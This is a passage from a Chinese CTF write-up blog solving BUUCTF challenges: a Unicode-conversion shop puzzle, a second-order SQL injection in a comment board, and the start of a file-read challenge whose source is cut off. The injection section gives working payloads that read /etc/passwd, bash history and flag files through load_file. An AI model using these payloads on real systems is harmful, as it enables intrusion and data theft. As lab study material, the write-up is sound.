shop</h1><p><strong>考点：unicode转换安全</strong></p><p>这个点确实没细看过。这次整理一下。</p><p>简单来看，Unicode的安全问题分为</p><p><strong>视觉欺骗</strong>：视觉问题一般指几个不同的不同的字符在某个字体下看起来较为相同。可能是字符之间一对一相似、多个字符的组合字符和一个字符相似等。</p><p>具体分类参考：</p><p><strong>非视觉漏洞</strong>：这些问题主要字符是转换导致的字符串。</p><blockquote><p>这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。举例来说，a 和ａ(\uff41)在某些字体下看起来可能相同，15和⑮(\u246e)其表示的数学意义可能相同，</p></blockquote><p>参考：</p><p>回到题目，是个独角兽商店。看这意思就是想让你把最贵那个买下来。</p><p>可以看见输入1337后它提示只允许输入一个字符。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207170443087.png" srcset="/img/loading.gif" alt="image-20201207170443087"></p><p>那么在网站<a href="https://www.compart.com/en/unicode/里找到一个值大于1337的字符就可以了。我选择了下面这个字符。" target="_blank" rel="noopener">https://www.compart.com/en/unicode/里找到一个值大于1337的字符就可以了。我选择了下面这个字符。</a></p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207170751695.png" srcset="/img/loading.gif" alt="image-20201207170751695"></p><p>输入后得到flag。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207170844549.png" srcset="/img/loading.gif" alt="image-20201207170844549"></p><h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><p><strong>考点：二次注入</strong></p><p>进去是个留言板。想随便提交点东西进去结果要你先登录。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207173518227.png" srcset="/img/loading.gif" alt="image-20201207173518227"></p><p>看这意思那就先爆破一下密码：zhangwei666</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207183926137.png" srcset="/img/loading.gif" alt="image-20201207183926137"></p><p>顺便扫了一下，诶，git泄露。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207184254128.png" srcset="/img/loading.gif" alt="image-20201207184254128"></p><p>结果就这一个文件，看起来也没啥用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>控制台这看到</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207184919010.png" srcset="/img/loading.gif" alt="image-20201207184919010"></p><p>又回githack恢复</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207205744610.png" srcset="/img/loading.gif" alt="image-20201207205744610"></p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207210021449.png" srcset="/img/loading.gif" alt="image-20201207210021449"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>                title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>                content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>                content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>                bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./comment.php?id=$bo_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>大概率二次注入，参数除了有转义以外没有其他过滤。</p><p>可以看到两个case里都存在$category这个参数，write里的是用户post传入，而comment里的是从数据库取出来的。</p><p>case write:</p><pre class=" language-php"><code class="language-php"><span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board        set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>            title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>            content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span></code></pre><p>case comment:</p><pre class=" language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment        set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>            content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>            bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>尽管write中插入数据时做了转义，但实际上存入数据库里的数据是并没有被转义的。因此write时存入一个$category，如</p><pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，<span class="token operator">/</span><span class="token operator">*</span></code></pre><p>同时comment中存入一个$content,如</p><pre class=" language-php"><code class="language-php"><span class="token operator">*</span><span class="token operator">/</span><span class="token shell-comment comment">#</span></code></pre><p>当comment执行insert语句时就会造成二次注入。</p><pre class=" language-php"><code class="language-php">insert into comment       set category <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，<span class="token comment" spellcheck="true">/*',           content = '*/</span><span class="token shell-comment comment">#',</span>           bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span></code></pre><p>综上，就可以构造语句找flag文件了。</p><p>（找文件的思路还要再学学 o.o</p><p>etc/passwd</p><pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208134544946.png" srcset="/img/loading.gif" alt="image-20201208134544946"></p><p>看到www用了bash登录，查看bash_history</p><pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/home/www/.bash_history"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span> </code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208135140457.png" srcset="/img/loading.gif" alt="image-20201208135140457"></p><p>删除了.DS_Store,那大概就是要找到他了。(hex显示完整文件)，解出来得到flag_8946e1ff1ee3e40f.php</p><pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/tmp/html/.DS_Store"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208140034925.png" srcset="/img/loading.gif" alt="image-20201208140034925"></p><pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/tmp/html/flag_8946e1ff1ee3e40f.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre><p>得到flag,但是不对，啊这..</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208140259192.png" srcset="/img/loading.gif" alt="image-20201208140259192"></p><p>想起来还有一个/var下的,得到正确flag。</p><pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/flag_8946e1ff1ee3e40f.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208140520735.png" srcset="/img/loading.gif" alt="image-20201208140520735"></p><h1 id="CISCN-2019-华北赛区-Day1-Web-Web1"><a href="#CISCN-2019-华北赛区-Day1-Web-Web1" class="headerlink" title="CISCN-2019-华北赛区-Day1-Web-Web1"></a>CISCN-2019-华北赛区-Day1-Web-Web1</h1><p>首先是个登录注册界面，不考虑其他的先随便注册一个登进去看看。</p><p>进入之后是一个上传文件，简单传了几个文件发现并没有做很严格的限制；除此之外上传的文件还有下载和删除功能；上传、下载、删除都分别抓了下包，发现在下载界面的download.php这里存在任意文件读取，依次读取以下源码：</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//class.php</span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token 